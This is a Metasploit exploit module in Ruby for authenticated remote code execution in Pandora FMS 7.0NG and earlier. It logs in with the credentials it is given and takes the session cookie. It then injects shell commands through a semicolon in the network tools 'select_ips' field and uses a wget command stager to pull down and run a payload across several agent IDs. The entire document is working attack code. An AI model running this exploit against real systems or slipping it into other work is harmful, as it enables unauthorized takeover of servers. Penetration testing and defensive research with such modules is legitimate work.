# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Pandora FMS Ping Authenticated Remote Code Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a vulnerability found in Pandora FMS 7.0NG and lower.
        net_tools.php in Pandora FMS 7.0NG allows remote attackers to execute arbitrary OS commands.
      },
      &#039;Author&#039;          =>
        [
          &#039;Onur ER <onur@onurer.net>&#039; # Vulnerability discovery and Metasploit module
        ],
      &#039;DisclosureDate&#039;  => &#039;2020-03-09&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;      => false,
      &#039;Targets&#039;         =>
        [
          [&#039;Automatic Target&#039;, {}]
        ],
      &#039;DefaultOptions&#039;  =>
        {
        },
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable Pandora FMS instance&#039;, &#039;/pandora_console/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate with&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;])
      ]
    )
  end

  def check
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri, &#039;index.php&#039;)
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.body =~ /Pandora/i
      return CheckCode::Safe
    end

    pandora_version = res.body.scan(/<div id="ver_num">v(.*?)<\/div>/).flatten.first
    version = Gem::Version.new(pandora_version)

    print_status("Pandora FMS version #{version}") if version

    if Gem::Version.new(version) <= Gem::Version.new(&#039;7.0NG&#039;)
      return Exploit::CheckCode::Appears
    end

    CheckCode::Detected
  end

  def authenticate
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri, &#039;index.php&#039;),
      &#039;vars_get&#039;  => {
        &#039;login&#039;   => &#039;1&#039;
      },
      &#039;vars_post&#039; => {
        &#039;nick&#039;          => datastore[&#039;USERNAME&#039;],
        &#039;pass&#039;          => datastore[&#039;PASSWORD&#039;],
        &#039;login_button&#039;  => &#039;Login&#039;
      }
    })

    return auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    unless res && res.code == 200 && res.body.include?(&#039;Welcome to Pandora FMS&#039;)
      print_error(&#039;Authentication failed!&#039;)
      return false
    end
    print_good(&#039;Successfully authenticated&#039;)
    print_status(&#039;Attempting to retrieve session cookie&#039;)
    @cookie = res.get_cookies
    unless @cookie.include?(&#039;PHPSESSID&#039;)
      print_error(&#039;Error retrieving cookie!&#039;)
      return false
    end
    print_good("Successfully retrieved session cookie: #{@cookie}")
    true
  end

  def exploit
    print_status(&#039;Exploiting...&#039;)
    execute_cmdstager(flavor: :wget, nospace: true)
  end

  def execute_command(cmd, opts = {})
    print_status("Attempting to authenticate using (#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]})")
    auth = authenticate
    unless auth
      fail_with Failure::NoAccess, &#039;Please provide a valid username and password.&#039;
    end

    id_agente = 1
    while !session_created? && id_agente <= 10
      send_request_cgi({
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri, &#039;index.php&#039;),
        &#039;cookie&#039;    => @cookie,
        &#039;vars_get&#039;  => {
          &#039;sec&#039;           => &#039;estado&#039;,
          &#039;sec2&#039;          => &#039;operation/agentes/ver_agente&#039;,
          &#039;tab&#039;           => &#039;extension&#039;,
          &#039;id_agente&#039;     => "#{id_agente}",
          &#039;id_extension&#039;  => &#039;network_tools&#039;
        },
        &#039;vars_post&#039; => {
          &#039;operation&#039;     => &#039;2&#039;,
          &#039;select_ips&#039;    => ";#{cmd}",
          &#039;community&#039;     => &#039;public&#039;,
          &#039;submit&#039;        => &#039;Execute&#039;
        }
      })

      id_agente += 1
    end
  end
end

